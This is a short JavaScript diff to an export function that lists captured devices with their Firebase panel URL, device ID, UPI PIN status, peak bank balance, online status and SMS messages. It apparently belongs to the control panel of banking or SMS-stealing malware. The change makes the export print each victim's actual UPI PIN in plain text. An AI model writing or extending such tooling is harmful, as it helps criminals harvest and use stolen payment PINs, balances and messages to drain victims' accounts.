@@ -2614,7 +2614,10 @@ function exportTxt(auto = false) {
     lines.push(`----------------+#[${i + 1}]-----------------`);
     lines.push(`Firebase: ${d.panelUrl || '—'}`);
     lines.push(`Device ID: ${d.id}`);
-    lines.push(`UPI PIN: ${hasPin(d) ? 'YES' : 'NO'}`);
+    if (hasPin(d)) {
+      const pv = String(d.upipin ?? d.upiPin ?? '').trim();
+      lines.push(`UPI PIN: YES${pv ? ' | PIN: ' + pv : ''}`);
+    } else lines.push('UPI PIN: NO');
     if (d.maxBalance) lines.push(`Peak Avl Bal: ${fmtBal(d.maxBalance)}`);
     lines.push(`Status: ${d.status ? 'Online' : 'Offline'} | Panel: ${d.panelName || '—'}`);
     smsList.forEach((m, j) => {
